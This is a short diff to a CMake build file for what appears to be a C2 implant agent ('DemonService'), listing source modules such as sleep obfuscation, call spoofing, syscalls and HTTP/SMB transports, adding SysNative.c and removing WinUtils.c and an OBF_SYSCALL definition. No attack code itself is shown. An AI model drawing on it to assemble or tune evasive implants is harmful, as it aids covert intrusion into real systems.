@@ -13,7 +13,6 @@ include_directories( Include )
 
 set( COMMON_SOURCE
         Source/Core/Command.c
-        Source/Core/WinUtils.c
         Source/Core/Win32.c
         Source/Core/MiniStd.c
         Source/Core/Token.c
@@ -21,6 +20,7 @@ set( COMMON_SOURCE
         Source/Core/SleepObf.c
         Source/Core/Spoof.c
         Source/Core/Syscalls.c
+        Source/Core/SysNative.c
         Source/Core/Command.c
         Source/Core/Transport.c
         Source/Core/TransportHttp.c
@@ -73,7 +73,6 @@ add_compile_definitions( CONFIG_SIZE=1024 )
 add_compile_definitions( CONFIG_KEY_BYTES={} )
 add_compile_definitions( CONFIG_KEY_SIZE=16 )
 add_compile_definitions( SERVICE_NAME="DemonService" )
-add_compile_definitions( OBF_SYSCALL )
 
 add_compile_definitions( TRANSPORT_HTTP )
 add_compile_definitions( TRANSPORT_SMB )
